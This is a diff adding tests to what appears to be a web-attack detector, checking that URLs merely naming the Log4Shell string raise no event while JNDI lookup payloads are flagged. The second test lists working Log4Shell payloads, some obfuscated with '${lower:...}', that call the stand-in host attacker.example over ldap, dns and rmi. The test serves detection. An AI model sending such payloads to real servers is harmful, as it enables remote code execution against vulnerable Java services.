@@ -209,6 +209,48 @@ describe("an attack in a request's URL", () => {
       ),
     ).toEqual([]);
   });
+
+  /*
+   * Issue #6419: the Log4Shell string with nothing to look up after it is
+   * somebody naming it - a search for it, a security tool's page about it.
+   */
+  test("a request that only names the Log4Shell string is no event", () => {
+    for (const url of [
+      "https://siem.example/search?q=%24%7Bjndi",
+      "https://siem.example/search?q=%24%7Bjndi%3A",
+      "https://siem.example/search?q=%24%7Bjndi%3A%27",
+      "https://siem.example/search?q='${jndi:'",
+      "https://siem.example/search?q=${jndi:%20or",
+      "https://siem.example/rules/${jndi:}",
+    ]) {
+      expect({
+        url,
+        event: buildTraceWebAttackEvent(
+          span({ attributes: { "url.full": url } }),
+        ),
+      }).toEqual({ url, event: null });
+    }
+  });
+
+  test("a request that looks a name up through the Log4Shell string is one", () => {
+    for (const url of [
+      "https://shop.example/?x=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.example%2Fa%7D",
+      "https://shop.example/?x=%24%7Bjndi:ldap://attacker.example/a%7D",
+      "https://shop.example/?x=%24%7Bjndi%3A%24%7Blower%3Al%7Ddap%3A%2F%2Fattacker.example%2Fa%7D",
+      "https://shop.example/?x=${jndi:dns://attacker.example/a}",
+      "https://shop.example/?x=${jndi:${lower:l}${lower:d}ap://attacker.example/a}",
+      "https://siem.example/search?q='${jndi:'&then=${jndi:rmi://attacker.example/a}",
+    ]) {
+      const event: NormalizedSecurityEvent | null = buildTraceWebAttackEvent(
+        span({ attributes: { "url.full": url } }),
+      );
+
+      expect({ url, message: event?.message.split(":")[0] }).toEqual({
+        url,
+        message: "Log4Shell exploit attempt",
+      });
+    }
+  });
 });
 
 describe("a forgery toward cloud metadata", () => {
